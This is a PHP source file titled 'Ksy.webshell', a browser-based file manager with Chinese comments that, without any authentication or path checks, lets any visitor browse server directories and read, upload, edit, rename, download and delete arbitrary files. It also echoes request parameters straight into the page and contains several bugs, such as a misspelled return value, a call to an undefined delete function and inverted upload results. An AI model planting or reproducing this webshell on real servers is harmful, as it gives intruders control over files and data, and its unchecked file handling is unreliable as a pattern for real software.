<?php
header("Content-Type: text/html; charset=utf-8");

define('IMG_EXT', array("gif","jpg","jpeg","png"));
/**
 * 遍历目录函数，只读取目录中的最外层的内容
 * @param string $dir 目录路径
 * @param bool $need  是否需要当前目录和上级目录
 * @return array
 */
function readDirectory($dir,$need=true) {
	$handle = opendir ( $dir );
	while ( ($item = readdir ( $handle )) !== false ) {
		//.和..这2个特殊目录
		if($need || ($item != "." && $item != "..")){
			$dir_arr[] = $item;
		}
	}
	closedir ( $handle );
	return $dir_arr;
}

/**
 * 转换字节大小 Bytes/Kb/MB/GB/TB/EB
 * @param number $size b
 * @return number
 */
function transByte($size) {
	$arr = array ("B", "K", "M", "G", "T", "E" );
	$i = 0;
	while ( $size >= 1024 ) {
		$size /= 1024;
		$i ++;
	}
	return round ( $size, 2 ) . $arr [$i];
}

/**
 * 得到文件夹大小
 * @param string $path
 * @return int
 */
function dirSize($path){
	$sum=0;
	global $sum;
	$handle = opendir($path);
	while(($item = readdir($handle))!==false){
		if($item != '.' && $item != '..'){
			if(is_file($path.'/'.$item)){
				$sum += filesize($path.'/'.$item);
			}
			if(is_dir($path.'/'.$item)){
				$func = __FUNCTION__;
				$func($path.'/'.$item);
			}
		}
	}
	closedir($handle);
	return transByte($sum);
}

/**
 * 判断文件是否存在BOM
 * @param string $filename 文件名
 * @return bool
 */
function checkBom ($filename) {
	$contents = file_get_contents($filename); 
	$char[1] = ord(substr($contents, 0, 1)); 
	$char[2] = ord(substr($contents, 1, 1)); 
	$char[3] = ord(substr($contents, 2, 1)); 
	if ($char[1] == 239 && $char[2] == 187 && $char[3] == 191) { 
		return true;
	}
	return fasle;
}

/**
 * 去除文件bom头
 * @param string $filename 文件名
 * @return bool
 */
function removeBom($filename){
	$contents = file_get_contents($filename); 
	$charset[1] = substr($contents, 0, 1); 
	$charset[2] = substr($contents, 1, 1); 
	$charset[3] = substr($contents, 2, 1); 
	if (ord($charset[1]) == 239 && ord($charset[2]) == 187 && ord($charset[3]) == 191) { 
		$rest = substr($contents, 3);
		return rewrite ($filename, $rest);
	}
	return true;
}

/**
 * 下载文件操作
 * @param string $filename
 */
function downFile($filename){
	header("content-disposition:attachment;filename=".basename($filename));
	header("content-length:".filesize($filename));
	readfile($filename);
}
/**
 * 删除文件夹或者文件
 * @param string $path
 * @return string
 */
function delFile($file){
	if(is_dir($file)){
		$handle = opendir($file);
		while(($item = readdir($handle)) !== false){
			if($item != "." && $item != ".."){
				if(is_file($file."/".$item)){
					unlink($file."/".$item);
				}
				if(is_dir($file."/".$item)){
					$func = __FUNCTION__;
					$func($file."/".$item);
				}
			}
		}
		closedir($handle);
		if(rmdir($file)){
			return array('state'=>'1','msg'=>'文件夹删除成功');
		}
	}else{
		if(unlink($file)){
			return array('state'=>'1','msg'=>'文件删除成功');
		}
	}
	return array('state'=>'0','msg'=>'文件删除失败');
}

/**
 *新建文件夹
 * @param string $filename
 * @return boolean
 */
function newDir($newDir){
	if(file_exists($newDir)){
		return array('state'=>'0','msg'=>'文件夹已存在');
	}
	if(mkdir($newDir,0777,true)){
		return array('state'=>'1','msg'=>'文件删除成功');
	}else{
		return array('state'=>'0','msg'=>'文件删除失败');
	}
}

/**
 *新建文件
 * @param string $filename
 * @return boolean
 */
function newFile($newFile){
	if(file_exists($newFile)){
		$result = array('state'=>'0','msg'=>'文件已存在');
	}
	if(touch($newFile)){
		$result = array('state'=>'1','msg'=>'文件创建成功');
	}else{
		$result = array('state'=>'0','msg'=>'文件创建失败');
	}
	return $result;
}

/**
 * 上传文件
 * @param array $fileInfo
 * @param string $path
 * @return json
 */
function upload($fileInfo,$path){
	//判断错误号
	if($fileInfo['error'] != UPLOAD_ERR_OK){
		switch($fileInfo['error']){
			case 1:
				$mes = "超过了配置文件的大小";
				break;
			case 2:
				$mes = "超过了表单允许接收数据的大小";
				break;
			case 3:
				$mes = "文件部分被上传";
				break;
			case 4:
				$mes = "没有文件被上传";
				break;
		}
		return array('state'=>'0','msg'=>$mes);
	}
	if(!is_uploaded_file($fileInfo['tmp_name'])){
		return array('state'=>'0','msg'=>'文件不是通过HTTP POST上传的');
	}
	if(file_exists($path . '\\' . $fileInfo['name'])){
		return array('state'=>'0','msg'=>'文件已经存在');
	}
	if(move_uploaded_file($fileInfo['tmp_name'], $path . '\\' . $fileInfo['name'])){
		return array('state'=>'0','msg'=>'文件上传失败');
	}
	return array('state'=>'1','msg'=>'文件上传成功');
}

/**
 * 获取图片的base64值
 * @param array $fileInfo
 * @param string $path
 * @return json
 */
function getImg($file){
	$type = getimagesize($file);//取得图片的大小，类型等
	$file_content = base64_encode(file_get_contents($file));
	switch($type[2]){//判读图片类型
		case 1:$img_type="gif";break;
		case 2:$img_type="jpg";break;
		case 3:$img_type="png";break;
	}
	$img='data:image/'.$img_type.';base64,'.$file_content;//合成图片的base64编码
	return array('state'=>'1','msg'=>'成功','data'=>$img);
}

/**
 * 修改文件内容
 */
function modify($file,$content){
	if(file_put_contents($file, $content)){
		$result = array('state'=>'1','msg'=>'修改成功');
	}else{
		$result = array('state'=>'1','msg'=>'修改成功');
	}
	echo json_encode($result);
}

/**
 * 修改文件内容
 */
function newName($path,$newName){
	if(rename($path,$newName)){
		return array('state'=>'1','msg'=>'重命名成功');
	}
	return array('state'=>'0','msg'=>'重命名失败');
}


//入口
// var_dump($_SERVER);
// echo $_GET['path'];exit;
if(!empty($_REQUEST['action'])){
	switch ($_REQUEST['action']) {
	    case 'newDir':
	        $result = newDir($_POST['dir']);
	        break;
	    case 'newFile':echo $_GET['path'];exit;
	        $result = newFile($_POST['file']);
	        break;
	    case 'del':
	        $result = del($_POST['file']);
	        break;
	    case 'upd':
	        $result = upload($_FILES['file'],$_GET['path']);
	        break;
	    case 'showText':
	        $result = array('state'=>1,'data'=>highlight_file($_POST['file'],true));
	        break;
	    case 'getText':
	        $result = array('state'=>1,'data'=>file_get_contents($_POST['file']));
	        break;
	    case 'showImg':
	        $result = getImg($_POST['file']);
	        break;
	    case 'rename':
	        $result = newName($_POST['file'],$_POST['newName']);
	        break;
	    case 'modify':
	        modify($_POST['file'],$_POST['content']);
	        break;
	    case 'download':
	        downFile($_GET['download']);
	        break;
	    default:
	    	$result = array('state'=>'0','msg'=>'url错误！');
	        break;
	}
	echo json_encode($result);
	exit;
}
function getCurrUrl(){
	$url = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
	$url = substr($url, -1) == '/' ? substr($url, 0, -1) : $url;
	$url = $url . '?dir=' . __DIR__;
	return $url;
}

define('CURR_URL', getCurrUrl());
define('DIR', substr($_GET['dir'], -1) == '/' ? $_GET['dir'] : $_GET['dir'] . '/');

if(!is_dir($_GET['dir'])){
	Header('Location: ' . CURR_URL);
}
$dirInfo = readDirectory(DIR,false);
$dirDetail = [];
foreach ($dirInfo as $v) {
	$path = DIR.$v;
	$type = filetype($path);
	$temp = [];
	$temp['name'] = $v;
	$temp['type'] = $type;
	$temp['size'] = is_dir($path) ? '---' : transByte(filesize($path));
	$temp['able']  = is_readable($path)?'r':'-';
	$temp['able'] .= is_writable($path)?'w':'-';
	$temp['able'] .= is_executable($path)?'e':'-';
	$temp['ctime'] = date('Y-m-d H:i:s',filectime($path));
	$temp['mtime'] = date('Y-m-d H:i:s',filemtime($path));
	$temp['atime'] = date('Y-m-d H:i:s',fileatime($path));
	$temp['bom']  = checkBom($path);
	$temp['open']  = null;
	$temp['rename']  = null;
	$temp['download']  = null;
	if($type == 'dir'){
		$temp['open'] = '<a href="'. CURR_URL.'/'.$v.'">open</a>';
	}else{
		if(in_array(pathinfo($v, PATHINFO_EXTENSION), IMG_EXT) ){
			$temp['open'] = '<a href="javascript:showImg('.$v.')">open</a>';
		}else{
			$temp['open'] = '<a href="javascript:showText('.$v.')">open</a>';
		}
		$temp['download']  = '<a href="'. CURR_URL.'/'.$v.'&action=download">download</a>';
	}
	$dirDetail[] = $temp;
}
$thead = array_keys($dirDetail[0]);

?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Ksy.webshell</title>
	<style type="text/css">
		body{background-color: #222222;color:#aaaaaa;}
		a{color:#aaaaaa;}
		h1{font-size: 70px;}
		#all{width:1200px;margin:0 auto;}
		#tool{margin: 15px;}
		#tool a{ font-size: 30px;}
		#div1{padding: 15px; height: 500px; overflow: auto; border: 1px #cccccc solid;}
		#newDir{display: none;}
		#newFile{display: none;}
		#upload{display: none;}
		#showWin{ width:800px; height:500px; background-color: #333333; border: 1px #cccccc solid; display: none; position: absolute; top: 50%; left: 50%;}
		#showCont{margin: top:10px; overflow: auto; }
		.winColse{ height: 10px;}
		.winColse a{ display: block; float: right;}
		#edit{ background-color: #333333; display: none;}
		#img{margin: 5;}
		#content{ width: 600px;height: 400px; background-color: #cccccc;}
		#lock{ width:100%; background-color: #333333; opacity:0.45; display: none; position: absolute; top: 0px; left: 0px; z-index: 10;}
	</style>
</head>
<body>
<div id="all">
	<div id="tool">
		<a href="<?php echo $_SERVER['PHP_SELF'];?>">Home</a>
		<a href="javascript:newFile();">newFile</a>
		<a href="javascript:newDir();">newDir</a>
		<a href="javascript:showUpload();">upload</a>
		<a href="<?php echo $_SERVER['PHP_SELF'] . '?path=' . dirname($_GET['path']);?>">old</a>
	</div>
	<div id="div1">
	    <table width="100%" cellpadding="0px">
	    	<thead>
		    	<tr>
		    		<td>num</td>
	    			<?php foreach($thead as $head){?>
	    			<td><?php echo $head;?></td>
	    			<?php }?>
		    	</tr>
	    	</thead>
	    	<tbody>
	    		<?php foreach($dirDetail as $k => $v){?>
	    		<tr>
	    			<td><?php echo ++$k;?></td>
	    			<?php foreach(array_values($v) as $c){?>
	    			<td><?php echo $c;?></td>
	    			<?php }?>
	    		</tr>
	    		<?php }?>
	    	</tbody>
	    	<tfoot>
	    		<tr>
	    			<td>total:<?php echo $k;?></td>
	    		</tr>
	    	</tfoot>
	    </table>
	</div>
	<div id="showWin">
		<div class="winColse"><a href="javascript:colseWin();">close</a><div>
		<div id="showCont"></div>
	</div>
	<div id="lock"></div>
</div>
</body>
<script type="text/javascript">
	var xhr;
	function $(id){
		return document.getElementById(id);
	}
	function colseWin(){
		$('showWin').style.display = 'none';
	}
	function createXHR(){
		if(window.XMLHttpRequest){
			xhr = new XMLHttpRequest();
		}else if(window.ActiveXObject){
			xhr = new ActiveXObject('Microsoft.XMLHTTP');
		}
		if(xhr){
			xhr.open('POST',window.location.href,true);
			xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		}
		return xhr;
	}
	function lock(){
		var lock = $("lock");
		lock.style.display = 'block';
	}
	function showWin(content){
		var showWin = $('showWin');
		showWin.style.top = (window.screen.availHeight - 500)/2 + 'px';
		showWin.style.left = (window.screen.availWidth - 800)/2 + 'px';
		var showCont = $('showCont');
		showCont.innerHTML = '';
		if(typeof(content) == 'object'){
			showCont.appendChild(content);
		}else{
			showCont.innerHTML = content;
		}
		showWin.style.display = 'block';
	}
	function newDir(){
		var newDir = window.prompt("新建文件夹","请在此输入文件夹名。");
		// alert(theResponse);
		xhr = createXHR();
		if(xhr){
			var data = "action=newDir&dir=" + newDir;
			xhr.onreadystatechange = function (){
				if(xhr.readyState == 4 && xhr.status == 200){
					var result =  eval('(' + xhr.responseText + ')');
					alert(result.msg);
					if(result.state){
						location.reload();
					}
				}
			};
			xhr.send(data);
		}
	}
	function newFile(){
		var newfile = window.prompt("新建文件","请在此输入文件名。");
		xhr = createXHR();
		if(xhr){
			var data = "action=newFile&file=" + newfile;
			xhr.onreadystatechange = function (){
				if(xhr.readyState == 4 && xhr.status == 200){alert(xhr.responseText);
					var result =  eval('(' + xhr.responseText + ')');
					alert(result.msg);
					if(result.state){
						location.reload();
					}
				}
			};
			xhr.send(data);
		}
	}
	function showUpload(){
		var text = '<form action="" method="post" enctype="multipart/form-data">'
			+ '<?php echo $_SERVER['REQUEST_URI'];?>'
			+ '<input type="file" name="file" />'
			+ '<input type="hidden" name="action" value="upd" />'
			+ '<input type="hidden" name="path" value="<?php echo $_GET['path'];?>" />'
			+ '<input type="submit" value="提交" /></form>';
		showWin(text);
	}
	function upload(){
		var file = document.getElementById('file').files[0];
		alert(file);return;
		xhr = createXHR();
		if(xhr){
			var data = "action=rename&file=" + $(k).value + "&newName=" + newName;
			xhr.onreadystatechange = function (){
				if(xhr.readyState == 4 && xhr.status == 200){
					var bac = xhr.responseText;
					alert(bac);
				}
			};
			xhr.send(data);
		}
	}
	function rename(k){
		var newName = window.prompt("重命名","请在此输入新名字。");
		xhr = createXHR();
		if(xhr){
			var data = "action=rename&file=" + $(k).value + "&newName=" + newName;
			xhr.onreadystatechange = function (){
				if(xhr.readyState == 4 && xhr.status == 200){
					var result =  eval('(' + xhr.responseText + ')');
					if(result.state){
						location.reload();
					}
				}
			};
			xhr.send(data);
		}
	}
	function showText(k){
		xhr = createXHR();
		if(xhr){
			var data = "action=showText&file=" + $(k).value;
			xhr.onreadystatechange = function (){
				if(xhr.readyState == 4 && xhr.status == 200){
					var result =  eval('(' + xhr.responseText + ')');
					if(result.state){
						showWin(result.data);
					}
				}
			};
			xhr.send(data);
		}
	}
	function showImg(k){
		xhr = createXHR();
		if(xhr){
			var data = "action=showImg&file=" + $(k).value;
			xhr.onreadystatechange = function (){
				if(xhr.readyState == 4 && xhr.status == 200){
					var result =  eval('(' + xhr.responseText + ')');
					if(result.state){
						var img = document.createElement('img');
						img.src = result.data;
						showWin(img);
					}
				}
			};
			xhr.send(data);
		}
	}
	function edit(k){
		var file = $(k).value;
		xhr = createXHR();
		if(xhr){
			var data = "action=getText&file=" + file;
			xhr.onreadystatechange = function (){
				if(xhr.readyState == 4 && xhr.status == 200){
					var result =  eval('(' + xhr.responseText + ')');
					if(result.state){
						var text = '<textarea id="content">' + result.data
						+ '</textarea><input type="hidden" id="file" value="' + file
						+ '" /><input type="button" onclick="modify();" value="提交" />';
						showWin(text);
					}
				}
			};
			xhr.send(data);
		}
	}
	function modify(){
		xhr = createXHR();
		if(xhr){
			var data = "action=modify&file=" + $('file').value + "&content=" + $('content').value;
			xhr.onreadystatechange = function (){
				if(xhr.readyState == 4 && xhr.status == 200){
					var result =  eval('(' + xhr.responseText + ')');
					if(result.state){
						colseWin();
					}
					alert(result.msg);
				}
			};
			xhr.send(data);
		}
	}
	function del(k){
		if(window.confirm('你确定要删除...?')){
			xhr = createXHR();
			if(xhr){
				var data = "action=del&file=" + $(k).value;
				xhr.onreadystatechange = function (){
					if(xhr.readyState == 4 && xhr.status == 200){
						var result =  eval('(' + xhr.responseText + ')');
						alert(result.msg);
						if(result.state){
							location.reload();
						}
					}
				};
				xhr.send(data);
			}
		}
	}
</script>
</html>